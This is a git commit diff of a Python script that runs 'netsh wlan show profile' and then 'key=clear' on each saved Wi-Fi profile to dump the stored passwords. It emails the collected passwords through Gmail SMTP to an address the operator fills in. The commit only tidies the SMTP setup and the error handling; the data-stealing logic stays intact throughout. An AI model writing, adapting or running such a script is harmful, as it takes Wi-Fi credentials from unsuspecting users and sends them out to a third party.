638c6cad69a09f88b0a17b2fe7bec1f99a71c3b7
trickdeath0 <70007454+trickdeath0@users.noreply.github.com>
2020-08-31 12:55:01 +0300

    Update execute_and_report.py

--- python/execute_and_report.py
+++ python/execute_and_report.py
@@ -1,14 +1,15 @@
 #!/usr/bin/env python
 
-###https://myaccount.google.com/lesssecureapps###
-
 import subprocess, smtplib, re
 from re import findall
 
+###https://myaccount.google.com/lesssecureapps###
 
 def send_mail(email, password, message):
-    try:       
-        server = smtplib.SMTP("smtp.gmail.com", 587) #587, 465
+    try:
+        smtp_host = "smtp.gmail.com"
+        smtp_port = 587
+        server = smtplib.SMTP(smtp_host, smtp_port) #587, 465
         #server.ehlo()
         server.starttls()
         server.login(email, password)
@@ -16,22 +17,26 @@ def send_mail(email, password, message):
         #server.close()
         server.quit()
 
+
         print("Email sent!")
-    except:
-        print("Something went worng...")
+    except Exception as e:
+        print(f"error: {e}")
+        #print("Something went worng...")
+
+
 
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-networks = str(networks)
+#networks = str(networks)
 networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
 
 result = ""
 for network_name in networks_names_list:
     command = "netsh wlan show profile " + network_name + " key=clear"
     current_result = subprocess.check_output(command, shell=True)
-    current_result = str(current_result)
+    #current_result = str(current_result)
     result = result + current_result
+    #print(result)
     
-
-send_mail("your_email@gmail.com", "Password", result)
+send_mail("your_email@gmail.com", "password", result)
